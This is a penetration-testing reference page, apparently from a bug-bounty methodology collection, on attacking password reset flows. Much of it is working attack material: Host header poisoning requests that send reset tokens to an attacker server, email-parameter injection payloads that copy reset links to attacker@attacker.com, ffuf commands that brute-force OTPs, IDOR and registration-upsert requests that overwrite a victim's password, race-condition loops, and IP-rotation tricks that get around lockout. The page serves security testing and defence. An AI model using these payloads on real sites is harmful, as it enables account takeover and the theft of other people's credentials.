# Reset Password

> **Summary**: Password reset functionality is a critical attack surface where flaws in token generation, delivery, validation, or flow logic allow attackers to reset arbitrary accounts and achieve account takeover.
> **Impact**: Account takeover, unauthorized access, privilege escalation.
> **Typical Severity**: High | Critical

## Detection

### Indicators

- Password reset tokens visible in URL parameters (susceptible to Referer leakage)
- Short or predictable reset tokens (numeric codes under 6 digits, UUIDv1, timestamp-based)
- Reset tokens that remain valid after a new token is generated
- Reset tokens with no expiration or very long expiration windows
- Reset endpoint accepts manipulated Host or X-Forwarded-Host headers
- Different response codes or body content for valid vs. invalid email addresses (user enumeration)
- No rate limiting on reset request or token verification endpoints

### Automated Detection

Test token entropy using Burp Sequencer:

```
1. Request 100+ password reset tokens for the same account
2. Send the tokens to Burp Sequencer for entropy analysis
3. Low entropy indicates predictable tokens
```

Fuzz the reset endpoint for parameter handling:

```bash
ffuf -u https://<TARGET>/api/reset-password -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"FUZZ"}' \
  -w <EMAIL_WORDLIST> -mc 200 -mr "reset link sent"
```

### Manual Detection

1. Request a password reset and intercept the full HTTP response
2. Check the reset link format: is the token short, numeric, UUID-based, or timestamp-based?
3. Request multiple resets and compare tokens for predictable patterns
4. Check if old tokens still work after requesting a new one
5. Test if the token is leaked in the Referer header by clicking an external link before using it
6. Check response differences between existing and non-existing email addresses

## Exploitation

### Prerequisites

- Access to the password reset functionality
- For some attacks: ability to intercept email (for token analysis) or control of a secondary email/domain
- For poisoning attacks: target application uses Host header or X-Forwarded-Host to construct reset URLs

### Step-by-Step

#### 1. Password Reset Token Analysis

Request multiple tokens and analyze patterns:

```bash
# Request 10 tokens and capture them
for i in $(seq 1 10); do
  curl -s -X POST https://<TARGET>/api/forgot-password \
    -H "Content-Type: application/json" \
    -d '{"email":"attacker@attacker.com"}' > /dev/null
done
# Check email inbox for tokens, compare for patterns
```

Check for:
- **Timestamp-based tokens**: tokens that correlate to request time
- **Sequential tokens**: tokens that increment predictably
- **UUIDv1 tokens**: contain embedded timestamp and MAC address (use [guidtool](https://github.com/intruder-io/guidtool) to analyze)
- **Short numeric codes**: 4-6 digit OTPs that can be brute-forced
- **Reused tokens**: same token returned for multiple requests

**Success criteria**: token generation pattern identified, allowing prediction or brute-force of valid tokens.

#### 2. Password Reset Poisoning (Host Header Injection)

Manipulate the Host header so the reset link points to an attacker-controlled server:

```http
POST /forgot-password HTTP/1.1
Host: <ATTACKER_SERVER>
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

If the Host header is validated, try alternatives:

```http
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: <ATTACKER_SERVER>
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

Other headers to try:

```
X-Forwarded-Host: <ATTACKER_SERVER>
X-Forwarded-Server: <ATTACKER_SERVER>
X-HTTP-Host-Override: <ATTACKER_SERVER>
Forwarded: host=<ATTACKER_SERVER>
```

When the victim clicks the reset link, the token is sent to the attacker's server.

**Success criteria**: reset email contains a link pointing to `<ATTACKER_SERVER>` with the valid reset token.

#### 3. Token Leakage via Referer Header

1. Request a password reset for your own account
2. Click the reset link but do NOT reset the password
3. On the reset page, click any external link (social media, analytics, etc.)
4. Intercept the outgoing request and check the `Referer` header

```
Referer: https://target.com/reset-password?token=abc123def456
```

**Success criteria**: the reset token appears in the Referer header sent to a third-party domain.

#### 4. Email Parameter Manipulation

Attempt to receive the victim's reset email by manipulating the email parameter:

```http
# Double parameter (first wins or last wins depending on backend)
POST /reset-password
email=victim@target.com&email=attacker@attacker.com
```

```http
# Carbon copy injection
POST /reset-password
email=victim@target.com%0a%0dcc:attacker@attacker.com
```

```http
# BCC injection
POST /reset-password
email=victim@target.com%0a%0dbcc:attacker@attacker.com
```

```http
# Comma separator
POST /reset-password
email=victim@target.com,attacker@attacker.com
```

```http
# Pipe separator
POST /reset-password
email=victim@target.com|attacker@attacker.com
```

```http
# Space separator
POST /reset-password
email=victim@target.com%20attacker@attacker.com
```

```http
# JSON array
POST /reset-password
Content-Type: application/json

{"email": ["victim@target.com", "attacker@attacker.com"]}
```

**Success criteria**: the reset token or link is sent to the attacker's email address in addition to (or instead of) the victim's.

#### 5. Response Manipulation

Intercept and modify the server response to bypass client-side validation:

1. Request a password reset for the victim's email
2. The server responds with an error (e.g., `{"status": "error", "message": "Invalid email"}`)
3. Modify the response in Burp to: `{"status": "success", "message": "Reset link sent"}`
4. If the client-side uses this response to show a token input form, enter a guessed or brute-forced token

Also test: change HTTP status code from 403/401 to 200 in the response.

**Success criteria**: client-side flow proceeds as if the request succeeded, exposing the token verification step.

#### 6. Token Reuse and Expiration Testing

```
1. Request a password reset (Token A is generated)
2. Request another password reset (Token B is generated)
3. Try to use Token A -- it should be invalidated but may still work
4. Reset the password using Token B
5. Try Token B again -- it should be invalidated after use
6. Wait beyond the stated expiration time, then try the token
```

**Success criteria**: old tokens, used tokens, or expired tokens still allow password reset.

#### 7. Brute-Force Reset Token

If the token is a short numeric code (4-6 digits):

```bash
# Brute-force a 4-digit OTP
ffuf -u https://<TARGET>/api/verify-reset -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com","code":"FUZZ"}' \
  -w <4_DIGIT_WORDLIST> -mc 200 -fc 400,401,429
```

Combine with rate limit bypass techniques (IP rotation, session rotation) if throttled.

**Success criteria**: valid token/code is identified, allowing password reset for the victim account.

#### 8. IDOR in Password Reset

Test if the reset endpoint allows changing other users' passwords by modifying identifiers:

```http
POST /api/reset-password HTTP/1.1
Content-Type: application/json
Authorization: Bearer <ATTACKER_TOKEN>

{"user_id": "<VICTIM_ID>", "new_password": "attacker_password123"}
```

Also test:

```http
POST /api/change-password HTTP/1.1
Content-Type: application/json

{"email": "victim@target.com", "new_password": "attacker_password123"}
```

**Success criteria**: password changed for a different user without proper authorization.

#### 9. Race Condition in Password Reset

Send multiple concurrent reset requests to exploit TOCTOU issues:

```bash
# Send 20 concurrent reset requests
for i in $(seq 1 20); do
  curl -s -X POST https://<TARGET>/api/reset-password \
    -H "Content-Type: application/json" \
    -d '{"token":"<VALID_TOKEN>","new_password":"newpass'$i'"}' &
done
wait
```

Using Turbo Intruder for precise timing of concurrent requests.

**Success criteria**: race condition causes unexpected behavior such as multiple successful resets, token reuse, or bypassed validation.

#### 10. Registration-as-Reset (Upsert Bypass)

If the registration endpoint performs an upsert (update-or-insert) on existing emails:

```http
POST /api/register HTTP/1.1
Content-Type: application/json

{"email": "victim@target.com", "password": "attacker_new_password"}
```

**Success criteria**: existing account password is overwritten without any ownership verification.

### Payloads

**Host header poisoning variants**:

```
Host: <ATTACKER_SERVER>
X-Forwarded-Host: <ATTACKER_SERVER>
X-Forwarded-Server: <ATTACKER_SERVER>
X-HTTP-Host-Override: <ATTACKER_SERVER>
Forwarded: host=<ATTACKER_SERVER>
```

**Email parameter injection variants**:

```
email=victim@target.com&email=attacker@attacker.com
email=victim@target.com%0a%0dcc:attacker@attacker.com
email=victim@target.com%0a%0dbcc:attacker@attacker.com
email=victim@target.com,attacker@attacker.com
email=victim@target.com|attacker@attacker.com
email="victim@target.com"%20"attacker@attacker.com"
{"email":["victim@target.com","attacker@attacker.com"]}
```

### Proof of Concept

```bash
# Test Host header poisoning
curl -v -X POST https://<TARGET>/forgot-password \
  -H "Host: <ATTACKER_SERVER>" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=victim@target.com"

# Check attacker server logs for incoming token request
# On attacker server:
python3 -m http.server 80
# Look for: GET /reset-password?token=<LEAKED_TOKEN>
```

## Bypasses

| Defense | Bypass Technique |
|---------|------------------|
| Host header validation | Use X-Forwarded-Host, Forwarded, or X-HTTP-Host-Override instead |
| Single email parameter enforcement | Try JSON array, cc/bcc injection, pipe/comma separators |
| Token rate limiting | IP rotation, session rotation, GraphQL batching -- see [rate-limit-bypass.md](rate-limit-bypass.md) |
| Long random tokens | Check if UUIDv1 (predictable), check token reuse, check Referer leakage |
| Client-side validation | Intercept and modify response in Burp proxy |
| Token expiration | Test boundary: use token just before and just after expiration |
| CAPTCHA on reset form | Check if CAPTCHA is validated server-side; test with empty/old CAPTCHA tokens |
| Account lockout after failed attempts | Rotate sessions, use different IP addresses |

## Escalation

- **Reset poisoning + account takeover**: steal reset tokens via Host header injection to take over any account -- see [host-header-injection.md](host-header-injection.md)
- **Token brute-force + rate limit bypass**: combine short token with rate limit bypass for full brute-force -- see [rate-limit-bypass.md](rate-limit-bypass.md)
- **IDOR in reset + privilege escalation**: reset admin passwords via unprotected API endpoints -- see [idor.md](idor.md)
- **Email parameter pollution + ATO**: receive victim's reset token via HPP techniques -- see [parameter-pollution.md](parameter-pollution.md)
- **Race condition + token reuse**: exploit TOCTOU to use a single token multiple times -- see [race-conditions.md](race-conditions.md)
- **Referer leakage + third-party compromise**: extract tokens from third-party analytics or ad networks

## Tools

| Tool | Usage |
|------|-------|
| [Burp Suite](https://portswigger.net/burp) | Intercept reset requests, modify headers, analyze responses |
| [Burp Sequencer](https://portswigger.net/burp/documentation/desktop/tools/sequencer) | Analyze entropy and randomness of reset tokens |
| [ffuf](https://github.com/ffuf/ffuf) | Brute-force short reset tokens/OTPs |
| [Turbo Intruder](https://portswigger.net/bappstore/9abfe09175514b1a8a37044e3c7d051f) | Race condition testing with precise concurrent request timing |
| [guidtool](https://github.com/intruder-io/guidtool) | Analyze and predict UUIDv1 tokens |
| [fireprox](https://github.com/ustayready/fireprox) | IP rotation for brute-force when rate-limited |
| [IPRotate](https://github.com/RhinoSecurityLabs/IPRotate_Burp_Extension) | Burp extension for AWS API Gateway IP rotation |

## References

- https://anugrahsr.github.io/posts/10-Password-reset-flaws/
- https://www.acunetix.com/blog/articles/password-reset-poisoning/
- https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning
- https://hackerone.com/reports/342693
- https://hackerone.com/reports/272379
- https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be
- https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3
